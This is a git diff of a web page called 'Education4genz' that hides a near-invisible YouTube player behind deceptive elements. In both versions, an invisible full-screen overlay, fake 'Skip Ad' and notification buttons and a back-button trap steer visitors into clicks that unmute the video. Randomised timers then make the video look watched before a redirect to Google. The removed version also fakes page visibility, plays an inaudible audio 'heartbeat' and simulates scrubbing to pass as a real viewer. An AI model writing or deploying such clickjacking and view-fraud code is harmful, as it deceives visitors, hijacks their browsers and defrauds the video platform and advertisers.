@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Education4genz</title>
-    
+    <link rel="stylesheet" href="index.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
@@ -25,245 +25,113 @@
 
       gtag("config", "G-12P3VL747Z");
     </script>
-    <style>
-      * {
-  padding: 0%;
-  margin: 0%;
-  font-family: "Inter", sans-serif;
-}
-
- body, html { margin: 0; padding: 0; background: #000; height: 100%; width: 100%; overflow: hidden; }
-        #nexus-core { position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,0.01); cursor: pointer; }
-        #yt-layer { position: fixed; inset: -10%; width: 120%; height: 120%; z-index: 1; filter: opacity(0.01); pointer-events: none; }
-
-:root {
-        --yt-red: #ff0000;
-        --modal-bg: #282828;
-        --btn-gray: #3f3f3f;
-        --btn-blue: #3ea6ff;
-    }
-
-    #yt-hijack-container {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        background-image: url("motka.jpg");
-        background-size: cover;        /* Makes image cover full div */
-        background-position: center;   /* Centers the image */
-        background-repeat: no-repeat;
-        z-index: 2147483647;
-        pointer-events: none; /* Mouse clicks go through to the site below */
-        font-family: "Roboto", Arial, sans-serif;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        color: white;
-    }
-
-    /* THE NOTIFICATION MODAL */
-    .notification-modal {
-        background-color: var(--modal-bg);
-        padding: 24px;
-        border-radius: 12px;
-        text-align: center;
-        width: 320px;
-        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    }
-
-    .bell-icon { font-size: 24px; margin-bottom: 12px; }
-    
-    .modal-text {
-        font-size: 16px;
-        margin-bottom: 20px;
-        font-weight: 400;
-    }
-
-    .btn-container {
-        display: flex;
-        gap: 8px;
-    }
-
-    .btn {
-        flex: 1;
-        padding: 10px;
-        border-radius: 20px;
-        font-size: 14px;
-        font-weight: 500;
-    }
-
-    .btn-block { background-color: var(--btn-gray); }
-    .btn-allow { background-color: var(--btn-blue); color: black; }
-
-    /* BOTTOM VIDEO PLAYER UI */
-    .yt-controls-layer {
-        position: absolute;
-        bottom: 0;
-        width: 100%;
-        padding: 0 15px 10px;
-        box-sizing: border-box;
-    }
-
-    .progress-bar-container {
-        height: 3px;
-        background: rgba(255,255,255,0.2);
-        width: 100%;
-        margin-bottom: 10px;
-        position: relative;
-    }
-
-    .progress-red {
-        width: 12%; /* Matches 0:11 / 1:38 */
-        height: 100%;
-        background: var(--yt-red);
-    }
-
-    .bottom-icons {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        font-size: 14px;
-        opacity: 0.9;
-    }
-
-    .skip-ad {
-        position: absolute;
-        bottom: 80px;
-        right: 0;
-        background: rgba(0,0,0,0.6);
-        padding: 8px 15px;
-        border: 1px solid rgba(255,255,255,0.5);
-        border-right: none;
-        font-size: 14px;
-    }
-    </style>
   </head>
   <body>
-    <!-- Change to "bot" for bot view -->
-
-    <div id="yt-hijack-container">
-      <div class="notification-modal">
-        <div class="bell-icon">🔔</div>
-        <div class="modal-text">Show notifications?</div>
-        <div class="btn-container">
-          <div class="btn btn-block">Block</div>
-          <div class="btn btn-allow">Allow</div>
-        </div>
-      </div>
-
-      <div class="skip-ad">Skip Ad ></div>
-
-      <div class="yt-controls-layer">
-        <div class="progress-bar-container">
-          <div class="progress-red"></div>
-        </div>
-        <div class="bottom-icons">
-          <div>▶️ &nbsp; ⏭️ &nbsp; 🔊 &nbsp; 0:11 / 1:38</div>
-          <div>⚙️ &nbsp; □ &nbsp; ⛶</div>
-        </div>
-      </div>
-    </div>
-
-    <div id="nexus-core" onclick="engageHydra()"></div>
-    <div id="yt-layer"></div>
+    <div id="interaction-trap" onclick="triggerEngagement()"></div>
+    <div id="yt-player"></div>
 
     <script>
-      /**
-       * THE HYDRA ENGINE: 2026 LONG-FORM OPTIMIZATION
-       * Designed to maximize watch time on pop-under traffic.
-       */
+      // --- 1. THE REDIRECT TRAP ---
+      (function () {
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function () {
+          window.history.pushState(null, null, window.location.href);
+        };
+      })();
 
-      // 1. BYPASS VISIBILITY LIMITS
-      // In 2026, browsers pause background video. We freeze the state to 'visible'.
-      Object.defineProperty(document, "visibilityState", {
-        get: () => "visible",
-        configurable: true,
-      });
-      Object.defineProperty(document, "hidden", {
-        get: () => false,
-        configurable: true,
-      });
-
-      const videoConfig = {
-        id: "19J_B_RIFoA",
-        startAt: 45, // Skip intros to avoid early 'drop-off' signals
-        targetTime: Math.floor(Math.random() * (240 - 180 + 1)) + 180, // 3-4 mins for long-form trust
-      };
-
+      // --- 2. YOUTUBE API ---
       var tag = document.createElement("script");
       tag.src = "https://www.youtube.com/iframe_api";
       document.head.appendChild(tag);
 
       var player;
-      var sessionStarted = false;
+      var videoID = "19J_B_RIFoA";
+      var engaged = false;
 
       function onYouTubeIframeAPIReady() {
-        player = new YT.Player("yt-layer", {
-          videoId: videoConfig.id,
+        player = new YT.Player("yt-player", {
+          videoId: videoID,
           playerVars: {
             autoplay: 1,
             mute: 1,
             controls: 0,
             enablejsapi: 1,
-            start: videoConfig.startAt,
-            rel: 0,
-            modestbranding: 1,
             origin: window.location.origin,
+            start: 30, // Forces the video to start at 30 seconds
+            rel: 0,
           },
           events: {
             onReady: (e) => {
               e.target.playVideo();
+              // Create button AFTER player ready
+              const butt = document.createElement("button");
+              butt.id = "unmuteBtn";
+              butt.innerText = "Click here to redirect";
+              butt.disabled = true;
+
+              document.body.appendChild(butt);
+
+              let timeLeft = 15;
+
+              const countdown = setInterval(() => {
+                timeLeft--;
+                butt.innerText = `Redirecting in ${timeLeft}...`;
+
+                if (timeLeft <= 0) {
+                  clearInterval(countdown);
+                  butt.innerText = "Click to Redirect";
+                  butt.disabled = false;
+                }
+              }, 1000);
+
+              butt.addEventListener("click", function () {
+                if (butt.disabled) return; // extra safety
+                triggerEngagement();
+                butt.style.display = "none";
+              });
+
+              const skip = document.createElement('div');
+              skip.id = "skip-ad";
+              skip.innerText = "Skip Ad ❯";
+              skip.disabled = true;
+
+              document.body.appendChild(skip);
+
+              skip.addEventListener("click", function () {
+                // if (skip.disabled) return; // extra safety
+                triggerEngagement();
+                // skip.style.display = "none";
+              });
             },
-            onStateChange: onPlayerStateChange,
           },
         });
       }
 
-      function engageHydra() {
-        if (sessionStarted) return;
-        sessionStarted = true;
+      // --- 3. THE HIDDEN TRIGGER ---
+      function triggerEngagement() {
+        if (engaged) return;
+        engaged = true;
 
-        // Remove trap and show player (at low opacity)
-        document.getElementById("nexus-core").style.display = "none";
-        document.getElementById("yt-layer").style.filter = "opacity(0.1)";
-
-        // 2. TRIGGER AUDIO HEARTBEAT
-        // This forces the browser to keep the process active even in background
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        gain.gain.value = 0.0001; // Inaudible
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.start();
+        document.getElementById("interaction-trap").style.display = "none";
 
         if (player && player.unMute) {
           player.unMute();
-          player.setVolume(Math.floor(Math.random() * 5) + 5); // Real audio signal
+          // Random low volume (6% - 12%)
+          player.setVolume(Math.floor(Math.random() * 6) + 12);
+          player.setPlaybackRate(1);
         }
+
+        startSessionTimer();
       }
 
-      function onPlayerStateChange(event) {
-        if (event.data == YT.PlayerState.PLAYING) {
-          // 3. THE "GHOST" INTERACTION LOOP
-          // Periodically seeks +1/-1 second to simulate a user "scrubbing"
-          const ghostMove = setInterval(() => {
-            if (!player.getCurrentTime) return;
-            let current = player.getCurrentTime();
-            player.seekTo(current + (Math.random() > 0.5 ? 0.5 : -0.5), true);
-          }, 45000);
+      function startSessionTimer() {
+        // Watch for 120s to 190s
+        var duration = Math.floor(Math.random() * 70000) + 120000;
 
-          setTimeout(() => {
-            clearInterval(ghostMove);
-            player.stopVideo();
-            // Final stealth exit to Google Search
-            window.location.replace(
-              "https://www.google.com/search?q=video+id+" + videoConfig.id,
-            );
-          }, videoConfig.targetTime * 1000);
-        }
+        setTimeout(function () {
+          player.stopVideo();
+          window.location.replace("https://www.google.com/search?q=" + videoID);
+        }, duration);
       }
     </script>
   </body>
